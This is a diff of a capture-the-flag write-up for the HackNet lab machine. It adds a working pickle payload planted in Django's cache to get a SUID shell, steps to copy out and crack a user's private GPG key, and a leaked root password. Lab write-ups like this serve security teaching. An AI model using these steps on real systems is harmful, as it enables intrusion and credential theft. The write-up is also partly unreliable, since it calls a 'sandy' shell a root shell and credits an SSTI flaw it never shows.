@@ -198,21 +198,132 @@ mikey
 
 ## Root Exploitation
 
-cat HackNet/settings.py 
-
-SECRET_KEY = 'agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'
-
-DATABASES = {
+We find the web application source code in the directory `/var/www/HackNet`. We see there is a cache configuration in the `settings.py` file:
+```python
+CACHES = {
     'default': {
-        'ENGINE': 'django.db.backends.mysql',
-        'NAME': 'hacknet',
-        'USER': 'sandy',
-        'PASSWORD': 'h@ckn3tDBpa$$',
-        'HOST':'localhost',
-        'PORT':'3306',
+        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
+        'LOCATION': '/var/tmp/django_cache',
+        'TIMEOUT': 60,
+        'OPTIONS': {'MAX_ENTRIES': 1000},
     }
 }
+```
 
-pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=
+We go to the cache directory and we see there are some cache files:
+```bash
+ls /var/tmp/django_cache
+```
+We see it is a empty directory.
+
+We try to create a cache file by searching for a word in the web application. We go to `explore` page and search for the word `diego`. This creates two cache files in the cache directory:
+```bash
+ls /var/tmp/django_cache
+```
+```
+647c31ce560000c70911a27dc1f6ea1e.djcache
+9521ccb242c5d9b2157674d30e05cc1.djcache
+```
+
+We will try to create a malicious cache file that will execute some code as the user `sandy`. We create a python script that will create a malicious cache file using `pickle` module:
+```python
+import pickle
+import os
+
+class Exploit(object):
+    def __reduce__(self):
+        cmd = (
+            "bash -c 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'"
+        )
+        return (os.system, (cmd,))
+
+filenames = [
+    "/var/tmp/django_cache/"+"647c31ce560000c70911a27dc1f6ea1e.djcache",
+    "/var/tmp/django_cache/"+"9521ccb242c5d9b2157674d30e05cc1b.djcache",
+]
+
+
+for filename in filenames:
+    with open(filename, "wb") as f:
+        pickle.dump(Exploit(), f)
+```
+This will create two malicious cache files that will copy `/bin/bash` to `/tmp/bash` and set the SUID bit on it.
+
+When a search is performed on the web application, Django will look for a cache file in the cache directory. If it finds one, it will load it, if not it will create a new one. 
+
+If we delete the cache files the application created, Django will load our malicious cache file and execute the code in it.
+
+We run the script and then we delete the cache files the application created:
+```bash
+rm /var/tmp/django_cache/647c31ce560000c70911a27dc1f6ea1e.djcache
+rm /var/tmp/django_cache/9521ccb242c5d9b2157674d30e05cc1b.djcache
+```
+
+We go to the `explore` page and search for the word `diego`. This will trigger Django to load our malicious cache file and execute the code in it.
+
+We now have a SUID bash shell in `/tmp/bash`. We can use this to get a root shell:
+```bash
+/tmp/bash -p
+whoami
+```
+```
+sandy
+```
+
+We also find in `/var/www/HackNet` a directory called `backups` that contains some gpg encrypted sql files. We transfer those encrypted files and sandy's private key to our machine and we try to crack the password using `gpg2john` and `john`:
+```bash
+mkdir /tmp/hacknet && cd /tmp/hacknet
+cp /var/www/HackNet/backups/* .
+cp /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc .
+python3 -m http.server 8000
+```
+
+```bash
+wget http://hacknet.htb:8000/backup01.sql.gpg
+wget http://hacknet.htb:8000/backup02.sql.gpg
+wget http://hacknet.htb:8000/backup03.sql.gpg
+wget http://hacknet.htb:8000/armored_key.asc
+gpg2john armored_key.asc > sandy_private.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt sandy_private.hash
+```
+```
+sandy:sweetheart
+```
+
+We now have the password for sandy's private key. We can use this to decrypt the sql files using a clean GNUPGHOME. 
+First, we create a new gpg environment to avoid messing with our own gpg configuration:
+```bash
+export GNUPGHOME=$(mktemp -d)
+```
+
+Then we import sandy's private key to the new gpg environment:
+```bash
+gpg --import armored_key.asc
+```
+This will ask for the passphrase. We enter `sweetheart`.
+
+Now we can decrypt the sql files:
+```bash
+gpg --decrypt backup01.sql.gpg > backup01.sql
+gpg --decrypt backup02.sql.gpg > backup02.sql
+gpg --decrypt backup03.sql.gpg > backup03.sql
+```
+
+We find in `backup02.sql` the following content:
+```
+50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99.
+```
+
+We try to su to `root` using the password we found:
+```bash
+su root
+Password: h4ck3rs4re3veRywh3re99
+whoami
+```
+```
+root
+```
 
 ## Conclusion
+
+We have successfully exploited the HackNet machine. We found a SSTI vulnerability in the web application that allowed us to execute arbitrary code as the user `sandy`. We then used a SUID bash shell to escalate our privileges to `sandy`. Finally, we cracked sandy's private key password and used it to decrypt some backup files that contained the root password.
